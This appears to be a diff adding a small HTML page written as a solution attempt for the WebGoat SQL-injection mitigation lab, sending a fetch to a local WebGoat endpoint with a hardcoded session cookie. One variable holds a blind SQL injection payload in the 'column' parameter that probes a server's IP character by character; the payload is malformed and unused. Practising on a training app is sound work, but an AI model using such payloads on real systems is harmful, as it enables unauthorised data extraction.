@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<h1>My First JavaScript</h1>
+
+<button type="button"
+onclick="doIt()">
+Click me.</button>
+
+<p id="demo"></p>
+<script>
+    const headers = {
+        Cookie : "JSSESSIONID=YUZMroPGRJSso499jhEVXbuXCDxyDwoSjsob_a1e",
+        "Access-Control-Allow-Headers": "Content-Type",
+        "Access-Control-Allow-Credentials": true,
+        "Access-Control-Allow-Origin": "*",
+        "Access-Control-Allow-Methods": "POST,GET,OPTIONS,PUT,DELETE"
+    }
+    async function doIt(){
+        const badSister=`http:localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=(CASE WHEN EXISTS (SELECT if FROM servers WHERE hostname='webgoat-prd' and substring(ip, 1, 1) = 'z'))`
+        
+    
+        await fetch(`http:localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=hostname`, {
+            method: 'GET', // or 'PUT'
+            headers: headers
+          })
+          .then(response => response.json())
+          .then(data => {
+            console.log('Success:', data);
+          })
+          .catch((error) => {
+            console.error('Error:', error);
+          });
+
+    }
+</script>
+
+</body>
+</html> 
